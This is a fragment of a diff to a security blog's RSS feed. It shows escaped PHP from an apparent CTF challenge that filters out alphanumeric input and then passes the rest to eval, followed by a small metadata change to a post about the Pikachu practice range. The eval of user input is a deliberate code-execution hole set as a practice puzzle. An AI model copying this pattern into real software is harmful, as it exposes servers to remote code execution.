class=&#34;keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;This is too Long.&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(preg_match(&lt;span class=&#34;string&#34;&gt;&amp;quot;/[A-Za-z0-9]+/&amp;quot;&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$code&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                        &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;NO.&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    @&lt;span class=&#34;keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$code&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            highlight_file(&lt;span class=&#34;keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 
@@ -409,8 +428,8 @@
             <guid isPermalink="true">https://ch1e.gitee.io/2021/06/18/pikachu/</guid>
             <title>pikachu靶场部分通关手册(持续更新中)</title>
             <link>https://ch1e.gitee.io/2021/06/18/pikachu/</link>
-            <category>web安全</category>
             <category>靶场练习</category>
+            <category>web安全</category>
             <pubDate>Fri, 18 Jun 2021 20:52:44 +0800</pubDate>
             <description><![CDATA[ &lt;div class=&#34;note info simple&#34;&gt;&lt;p&gt;最近发现，之前学的各种东西已经比较生疏了，所以重新来通关一个靶场来回忆一下&lt;/p&gt;
 &lt;/div&gt;
